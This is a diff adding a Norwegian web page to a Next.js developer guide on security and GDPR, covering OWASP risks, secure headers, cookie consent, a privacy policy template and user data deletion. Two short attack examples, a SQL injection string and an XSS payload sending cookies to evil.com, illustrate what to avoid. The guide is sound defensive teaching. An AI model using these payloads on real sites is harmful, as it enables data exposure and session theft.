@@ -1,0 +1,598 @@
+<!DOCTYPE html>
+<html lang="no">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Sikkerhet og GDPR - Next.js Guide</title>
+  <link rel="stylesheet" href="../assets/styles.css">
+  <style>
+    .gdpr-box {
+      background: linear-gradient(135deg, #dbeafe 0%, #eff6ff 100%);
+      border: 1px solid #3b82f6;
+      border-radius: 12px;
+      padding: 1.5rem;
+      margin: 1.5rem 0;
+    }
+    .gdpr-box h4 {
+      color: #1d4ed8;
+      margin-top: 0;
+    }
+    .security-level {
+      display: inline-block;
+      padding: 0.25rem 0.75rem;
+      border-radius: 20px;
+      font-size: 0.8rem;
+      font-weight: 600;
+      margin-left: 0.5rem;
+    }
+    .level-critical {
+      background: #fee2e2;
+      color: #dc2626;
+    }
+    .level-high {
+      background: #fef3c7;
+      color: #d97706;
+    }
+    .level-medium {
+      background: #dbeafe;
+      color: #2563eb;
+    }
+    .attack-demo {
+      background: #1f2937;
+      color: #f3f4f6;
+      padding: 1rem;
+      border-radius: 8px;
+      margin: 1rem 0;
+      font-family: monospace;
+    }
+    .attack-demo .bad {
+      color: #ef4444;
+    }
+    .attack-demo .good {
+      color: #22c55e;
+    }
+  </style>
+</head>
+<body>
+  <nav class="nav">
+    <a href="../index.html">Hjem</a>
+    <a href="index.html">Hurtigstart</a>
+    <a href="sjekkliste.html">Sjekkliste</a>
+    <a href="sikkerhet.html"><strong>Sikkerhet</strong></a>
+  </nav>
+
+  <div class="container">
+    <h1>Sikkerhet og GDPR</h1>
+
+    <blockquote>
+      <p>Bygg sikre nettsider fra dag én. Unngå de vanligste feilene som fører til datalekkasjer.</p>
+    </blockquote>
+
+    <div class="warning-box">
+      <strong>Viktig:</strong> Sikkerhet er ikke valgfritt. En enkel feil kan føre til bøter (GDPR) eller tap av kunders tillit.
+    </div>
+
+    <!-- OWASP TOP 10 -->
+    <h2>OWASP Top 10: De vanligste sårbarhetene</h2>
+
+    <h3>1. SQL Injection <span class="security-level level-critical">Kritisk</span></h3>
+    <p class="section-desc">
+      Angripere kan kjøre vilkårlige SQL-kommandoer mot databasen din.
+    </p>
+
+    <div class="attack-demo">
+      <span class="bad">// FARLIG - Aldri gjør dette!</span><br>
+      const query = `SELECT * FROM users WHERE email = '${userInput}'`<br><br>
+      <span class="bad">// Angriper skriver:</span> ' OR '1'='1<br>
+      <span class="bad">// Resultat:</span> SELECT * FROM users WHERE email = '' OR '1'='1'<br>
+      <span class="bad">// = Returnerer ALLE brukere!</span>
+    </div>
+
+    <pre><code>// TRYGT - Bruk Supabase sine metoder (parameterisert)
+const { data } = await supabase
+  .from("users")
+  .select("*")
+  .eq("email", userInput)  // Supabase escaper automatisk
+
+// TRYGT - Eller bruk prepared statements
+const { data } = await supabase.rpc("get_user_by_email", {
+  user_email: userInput
+})</code></pre>
+
+    <h3>2. XSS (Cross-Site Scripting) <span class="security-level level-critical">Kritisk</span></h3>
+    <p class="section-desc">
+      Angripere injiserer ondsinnet JavaScript som kjører i andre brukeres nettleser.
+    </p>
+
+    <div class="attack-demo">
+      <span class="bad">// FARLIG - Aldri bruk dangerouslySetInnerHTML med brukerdata!</span><br>
+      &lt;div dangerouslySetInnerHTML={{ __html: userComment }} /&gt;<br><br>
+      <span class="bad">// Angriper skriver:</span> &lt;script&gt;fetch('https://evil.com?cookie=' + document.cookie)&lt;/script&gt;<br>
+      <span class="bad">// Resultat:</span> Stjeler cookies fra alle som ser kommentaren
+    </div>
+
+    <pre><code>// TRYGT - React escaper automatisk
+function Comment({ text }: { text: string }) {
+  return &lt;p&gt;{text}&lt;/p&gt;  // React escaper spesialtegn
+}
+
+// TRYGT - Hvis du MÅ rendre HTML, sanitér først
+import DOMPurify from "dompurify"
+
+function SafeHTML({ html }: { html: string }) {
+  const clean = DOMPurify.sanitize(html)
+  return &lt;div dangerouslySetInnerHTML={{ __html: clean }} /&gt;
+}</code></pre>
+
+    <h3>3. Broken Authentication <span class="security-level level-high">Høy</span></h3>
+    <p class="section-desc">
+      Svake passord, manglende rate limiting, eller dårlig sesjonshåndtering.
+    </p>
+
+    <pre><code>// ✅ Passord-hashing med bcrypt
+import bcrypt from "bcryptjs"
+
+// Ved registrering
+const hashedPassword = await bcrypt.hash(password, 12)  // 12 rounds
+
+// Ved innlogging
+const isValid = await bcrypt.compare(inputPassword, hashedPassword)
+
+// ✅ JWT med sikre innstillinger
+import jwt from "jsonwebtoken"
+
+const token = jwt.sign(
+  { userId: user.id },
+  process.env.JWT_SECRET!,
+  {
+    expiresIn: "7d",
+    algorithm: "HS256"
+  }
+)
+
+// ✅ Sikre cookies
+cookies().set("token", token, {
+  httpOnly: true,     // Ikke tilgjengelig via JavaScript
+  secure: true,       // Kun HTTPS
+  sameSite: "strict", // Hindrer CSRF
+  maxAge: 60 * 60 * 24 * 7
+})</code></pre>
+
+    <h3>4. Rate Limiting <span class="security-level level-high">Høy</span></h3>
+    <p class="section-desc">
+      Uten rate limiting kan angripere brute-force passord eller overbelaste serveren.
+    </p>
+
+    <pre><code>// src/lib/rate-limit.ts
+const attempts = new Map&lt;string, { count: number; lastAttempt: number }&gt;()
+
+export function rateLimit(ip: string, limit: number = 5, windowMs: number = 60000) {
+  const now = Date.now()
+  const record = attempts.get(ip)
+
+  if (!record) {
+    attempts.set(ip, { count: 1, lastAttempt: now })
+    return { allowed: true, remaining: limit - 1 }
+  }
+
+  // Reset hvis vinduet er utløpt
+  if (now - record.lastAttempt > windowMs) {
+    attempts.set(ip, { count: 1, lastAttempt: now })
+    return { allowed: true, remaining: limit - 1 }
+  }
+
+  // Sjekk om grensen er nådd
+  if (record.count >= limit) {
+    return { allowed: false, remaining: 0 }
+  }
+
+  record.count++
+  record.lastAttempt = now
+  return { allowed: true, remaining: limit - record.count }
+}
+
+// Bruk i Server Action
+export async function login(data: LoginData) {
+  const ip = headers().get("x-forwarded-for") || "unknown"
+  const { allowed, remaining } = rateLimit(ip, 5, 60000)
+
+  if (!allowed) {
+    return { success: false, message: "For mange forsøk. Prøv igjen om 1 minutt." }
+  }
+
+  // ... resten av login-logikken
+}</code></pre>
+
+    <h3>5. CSRF (Cross-Site Request Forgery) <span class="security-level level-medium">Medium</span></h3>
+    <p class="section-desc">
+      Angriper lurer bruker til å utføre handlinger de ikke ønsket.
+    </p>
+
+    <pre><code>// Next.js Server Actions har innebygd CSRF-beskyttelse!
+// Du trenger ikke gjøre noe ekstra.
+
+// MEN: For API Routes, bruk csrf-token:
+// npm install csrf
+
+import Tokens from "csrf"
+const tokens = new Tokens()
+
+// Generer token (i getServerSideProps eller API)
+const secret = tokens.secretSync()
+const csrfToken = tokens.create(secret)
+
+// Verifiser i API-route
+export async function POST(req: Request) {
+  const { csrfToken } = await req.json()
+
+  if (!tokens.verify(secret, csrfToken)) {
+    return Response.json({ error: "Invalid CSRF token" }, { status: 403 })
+  }
+
+  // ... fortsett
+}</code></pre>
+
+    <!-- SIKKER KONFIGURASJON -->
+    <h2>Sikker konfigurasjon</h2>
+
+    <h3>Security Headers</h3>
+    <p class="section-desc">
+      HTTP-headers som beskytter mot vanlige angrep. Legg til i next.config.ts.
+    </p>
+
+    <pre><code>// next.config.ts
+import type { NextConfig } from "next"
+
+const securityHeaders = [
+  {
+    key: "X-DNS-Prefetch-Control",
+    value: "on"
+  },
+  {
+    key: "Strict-Transport-Security",
+    value: "max-age=63072000; includeSubDomains; preload"
+  },
+  {
+    key: "X-Frame-Options",
+    value: "SAMEORIGIN"
+  },
+  {
+    key: "X-Content-Type-Options",
+    value: "nosniff"
+  },
+  {
+    key: "Referrer-Policy",
+    value: "origin-when-cross-origin"
+  },
+  {
+    key: "Permissions-Policy",
+    value: "camera=(), microphone=(), geolocation=()"
+  }
+]
+
+const nextConfig: NextConfig = {
+  async headers() {
+    return [
+      {
+        source: "/:path*",
+        headers: securityHeaders
+      }
+    ]
+  }
+}
+
+export default nextConfig</code></pre>
+
+    <h3>Miljøvariabler</h3>
+    <p class="section-desc">
+      Aldri hardkod hemmeligheter. Bruk miljøvariabler riktig.
+    </p>
+
+    <pre><code>// .env.local (ALDRI commit til git!)
+SUPABASE_PROJECT_URL=https://xxx.supabase.co
+SUPABASE_API_KEY=eyJ...
+JWT_SECRET=minimum-32-characters-random-string
+SMTP_PASSWORD=hemmelighet
+
+// .gitignore
+.env
+.env.local
+.env.*.local
+
+// Valider at variabler finnes ved oppstart
+// src/config/env.ts
+function getEnvVar(key: string): string {
+  const value = process.env[key]
+  if (!value) {
+    throw new Error(`Missing environment variable: ${key}`)
+  }
+  return value
+}
+
+export const env = {
+  supabaseUrl: getEnvVar("SUPABASE_PROJECT_URL"),
+  supabaseKey: getEnvVar("SUPABASE_API_KEY"),
+  jwtSecret: getEnvVar("JWT_SECRET")
+}</code></pre>
+
+    <!-- GDPR -->
+    <h2>GDPR-veiledning</h2>
+
+    <div class="gdpr-box">
+      <h4>Hva er GDPR?</h4>
+      <p>General Data Protection Regulation er EUs personvernlov. Den gjelder for alle som behandler persondata for EU/EØS-borgere. Brudd kan gi bøter på opptil 4% av global omsetning.</p>
+    </div>
+
+    <h3>Prinsipper du MÅ følge</h3>
+    <table>
+      <tr>
+        <th>Prinsipp</th>
+        <th>Hva det betyr</th>
+        <th>Praktisk eksempel</th>
+      </tr>
+      <tr>
+        <td><strong>Lovlighet</strong></td>
+        <td>Ha gyldig grunn for databehandling</td>
+        <td>Samtykke eller kontrakt</td>
+      </tr>
+      <tr>
+        <td><strong>Formålsbegrensning</strong></td>
+        <td>Kun bruk data til oppgitt formål</td>
+        <td>Ikke selg e-postliste til tredjepart</td>
+      </tr>
+      <tr>
+        <td><strong>Dataminimering</strong></td>
+        <td>Kun samle nødvendig data</td>
+        <td>Ikke spør om fødselsår for nyhetsbrev</td>
+      </tr>
+      <tr>
+        <td><strong>Nøyaktighet</strong></td>
+        <td>Hold data oppdatert</td>
+        <td>La brukere redigere profil</td>
+      </tr>
+      <tr>
+        <td><strong>Lagringsbegrensning</strong></td>
+        <td>Slett data når ikke lenger nødvendig</td>
+        <td>Slett inaktive kontoer etter 2 år</td>
+      </tr>
+      <tr>
+        <td><strong>Sikkerhet</strong></td>
+        <td>Beskytt data mot uautorisert tilgang</td>
+        <td>Kryptering, tilgangskontroll</td>
+      </tr>
+    </table>
+
+    <h3>Cookie-banner</h3>
+    <p class="section-desc">
+      Påkrevd hvis du bruker cookies utover det som er strengt nødvendig for nettsidens funksjon.
+    </p>
+
+    <pre><code>// src/components/functional/CookieBanner.tsx
+"use client"
+
+import { useState, useEffect } from "react"
+import { Button } from "@/components/ui/button"
+
+export default function CookieBanner() {
+  const [showBanner, setShowBanner] = useState(false)
+
+  useEffect(() => {
+    const consent = localStorage.getItem("cookie-consent")
+    if (!consent) {
+      setShowBanner(true)
+    }
+  }, [])
+
+  const acceptAll = () => {
+    localStorage.setItem("cookie-consent", JSON.stringify({
+      necessary: true,
+      analytics: true,
+      marketing: true,
+      timestamp: new Date().toISOString()
+    }))
+    setShowBanner(false)
+    // Initialiser analytics her
+  }
+
+  const acceptNecessary = () => {
+    localStorage.setItem("cookie-consent", JSON.stringify({
+      necessary: true,
+      analytics: false,
+      marketing: false,
+      timestamp: new Date().toISOString()
+    }))
+    setShowBanner(false)
+  }
+
+  if (!showBanner) return null
+
+  return (
+    &lt;div className="fixed bottom-0 left-0 right-0 bg-gray-900 text-white p-4 z-50"&gt;
+      &lt;div className="max-w-6xl mx-auto flex flex-col md:flex-row items-center justify-between gap-4"&gt;
+        &lt;div className="text-sm"&gt;
+          &lt;p&gt;Vi bruker cookies for å forbedre din opplevelse.
+          &lt;a href="/personvern" className="underline ml-1"&gt;Les mer&lt;/a&gt;&lt;/p&gt;
+        &lt;/div&gt;
+        &lt;div className="flex gap-2"&gt;
+          &lt;Button variant="outline" onClick={acceptNecessary}&gt;
+            Kun nødvendige
+          &lt;/Button&gt;
+          &lt;Button onClick={acceptAll}&gt;
+            Godta alle
+          &lt;/Button&gt;
+        &lt;/div&gt;
+      &lt;/div&gt;
+    &lt;/div&gt;
+  )
+}</code></pre>
+
+    <h3>Personvernerklæring (mal)</h3>
+    <p class="section-desc">
+      Hver nettside som samler persondata MÅ ha en personvernerklæring.
+    </p>
+
+    <pre><code>// src/app/(public)/personvern/page.tsx
+export const metadata = {
+  title: "Personvernerklæring"
+}
+
+export default function PersonvernPage() {
+  return (
+    &lt;div className="max-w-3xl mx-auto py-12 px-4"&gt;
+      &lt;h1 className="text-3xl font-bold mb-8"&gt;Personvernerklæring&lt;/h1&gt;
+
+      &lt;section className="mb-8"&gt;
+        &lt;h2 className="text-xl font-semibold mb-4"&gt;1. Behandlingsansvarlig&lt;/h2&gt;
+        &lt;p&gt;[Firmanavn] er behandlingsansvarlig for personopplysninger som samles inn via denne nettsiden.&lt;/p&gt;
+        &lt;p&gt;Kontakt: [epost@firma.no]&lt;/p&gt;
+      &lt;/section&gt;
+
+      &lt;section className="mb-8"&gt;
+        &lt;h2 className="text-xl font-semibold mb-4"&gt;2. Hvilke opplysninger vi samler&lt;/h2&gt;
+        &lt;ul className="list-disc pl-6"&gt;
+          &lt;li&gt;Kontaktskjema: Navn, e-post, melding&lt;/li&gt;
+          &lt;li&gt;Tekniske data: IP-adresse, nettlesertype (via server-logger)&lt;/li&gt;
+          &lt;li&gt;Cookies: Se vår cookie-policy&lt;/li&gt;
+        &lt;/ul&gt;
+      &lt;/section&gt;
+
+      &lt;section className="mb-8"&gt;
+        &lt;h2 className="text-xl font-semibold mb-4"&gt;3. Formål med behandlingen&lt;/h2&gt;
+        &lt;p&gt;Vi bruker opplysningene til å:&lt;/p&gt;
+        &lt;ul className="list-disc pl-6"&gt;
+          &lt;li&gt;Besvare henvendelser via kontaktskjema&lt;/li&gt;
+          &lt;li&gt;Forbedre nettsiden basert på bruksstatistikk&lt;/li&gt;
+        &lt;/ul&gt;
+      &lt;/section&gt;
+
+      &lt;section className="mb-8"&gt;
+        &lt;h2 className="text-xl font-semibold mb-4"&gt;4. Rettslig grunnlag&lt;/h2&gt;
+        &lt;p&gt;Behandlingen baserer seg på:&lt;/p&gt;
+        &lt;ul className="list-disc pl-6"&gt;
+          &lt;li&gt;Samtykke (kontaktskjema, analytics)&lt;/li&gt;
+          &lt;li&gt;Berettiget interesse (sikkerhetslogger)&lt;/li&gt;
+        &lt;/ul&gt;
+      &lt;/section&gt;
+
+      &lt;section className="mb-8"&gt;
+        &lt;h2 className="text-xl font-semibold mb-4"&gt;5. Dine rettigheter&lt;/h2&gt;
+        &lt;p&gt;Du har rett til å:&lt;/p&gt;
+        &lt;ul className="list-disc pl-6"&gt;
+          &lt;li&gt;Be om innsyn i dine data&lt;/li&gt;
+          &lt;li&gt;Kreve retting eller sletting&lt;/li&gt;
+          &lt;li&gt;Trekke tilbake samtykke&lt;/li&gt;
+          &lt;li&gt;Klage til Datatilsynet&lt;/li&gt;
+        &lt;/ul&gt;
+      &lt;/section&gt;
+
+      &lt;section className="mb-8"&gt;
+        &lt;h2 className="text-xl font-semibold mb-4"&gt;6. Lagring&lt;/h2&gt;
+        &lt;p&gt;Kontaktskjema-meldinger lagres i 2 år, deretter slettes de automatisk.&lt;/p&gt;
+      &lt;/section&gt;
+
+      &lt;p className="text-sm text-gray-500"&gt;Sist oppdatert: {new Date().toLocaleDateString("no-NO")}&lt;/p&gt;
+    &lt;/div&gt;
+  )
+}</code></pre>
+
+    <h3>Brukerrettigheter: Sletting og eksport</h3>
+    <p class="section-desc">
+      GDPR krever at brukere kan slette sine data og eksportere dem.
+    </p>
+
+    <pre><code>// src/actions/gdpr.ts
+"use server"
+
+import supabase from "@/config/supabase-config"
+import { getLoggedInUser } from "./users"
+
+// Eksporter alle brukerdata
+export async function exportUserData() {
+  const { data: user } = await getLoggedInUser()
+  if (!user) return { success: false, message: "Ikke innlogget" }
+
+  // Hent all brukerdata
+  const { data: userData } = await supabase
+    .from("users")
+    .select("id, name, email, created_at")
+    .eq("id", user.id)
+    .single()
+
+  const { data: messages } = await supabase
+    .from("contact_messages")
+    .select("*")
+    .eq("email", user.email)
+
+  // Returner som JSON
+  return {
+    success: true,
+    data: {
+      user: userData,
+      messages: messages,
+      exportedAt: new Date().toISOString()
+    }
+  }
+}
+
+// Slett bruker og all tilknyttet data
+export async function deleteUserAccount() {
+  const { data: user } = await getLoggedInUser()
+  if (!user) return { success: false, message: "Ikke innlogget" }
+
+  // Slett relaterte data først
+  await supabase.from("contact_messages").delete().eq("email", user.email)
+
+  // Slett brukeren
+  const { error } = await supabase.from("users").delete().eq("id", user.id)
+
+  if (error) return { success: false, message: error.message }
+
+  // Slett cookie
+  const { cookies } = await import("next/headers")
+  const cookieStore = await cookies()
+  cookieStore.delete("token")
+
+  return { success: true, message: "Konto slettet" }
+}</code></pre>
+
+    <!-- SIKKERHETSTSJEKKLISTE -->
+    <h2>Sikkerhetssjekkliste før lansering</h2>
+
+    <div class="checklist">
+      <ul>
+        <li><input type="checkbox"> Alle passord hashes med bcrypt (minst 10 rounds)</li>
+        <li><input type="checkbox"> JWT-hemmelighet er minst 32 tegn og tilfeldig generert</li>
+        <li><input type="checkbox"> Cookies er httpOnly, secure og sameSite=strict</li>
+        <li><input type="checkbox"> Rate limiting på login/registrering</li>
+        <li><input type="checkbox"> Ingen SQL-queries med brukerinput direkte i strengen</li>
+        <li><input type="checkbox"> Ingen dangerouslySetInnerHTML med brukerdata</li>
+        <li><input type="checkbox"> Security headers konfigurert i next.config.ts</li>
+        <li><input type="checkbox"> HTTPS aktivert med gyldig SSL-sertifikat</li>
+        <li><input type="checkbox"> Miljøvariabler ikke committet til git</li>
+        <li><input type="checkbox"> Supabase RLS (Row Level Security) aktivert</li>
+        <li><input type="checkbox"> Cookie-banner implementert (hvis nødvendig)</li>
+        <li><input type="checkbox"> Personvernerklæring publisert</li>
+        <li><input type="checkbox"> Slettemekanisme for brukerdata tilgjengelig</li>
+      </ul>
+    </div>
+
+    <h2>Nyttige ressurser</h2>
+    <ul>
+      <li><a href="https://owasp.org/Top10/" target="_blank">OWASP Top 10 (2021)</a></li>
+      <li><a href="https://www.datatilsynet.no" target="_blank">Datatilsynet (Norsk GDPR-myndighet)</a></li>
+      <li><a href="https://gdpr.eu" target="_blank">GDPR.eu - Veiledning</a></li>
+      <li><a href="https://securityheaders.com" target="_blank">Security Headers Scanner</a></li>
+    </ul>
+
+    <div class="success-box">
+      <strong>Godt jobbet!</strong> Ved å følge denne guiden bygger du nettsider som beskytter brukernes data og følger norsk lov.
+    </div>
+
+    <div class="footer">
+      <p><a href="sjekkliste.html">← Sjekkliste</a> | <a href="../index.html">Til hovedsiden →</a></p>
+    </div>
+  </div>
+
+  <script src="../assets/copy-code.js"></script>
+</body>
+</html>
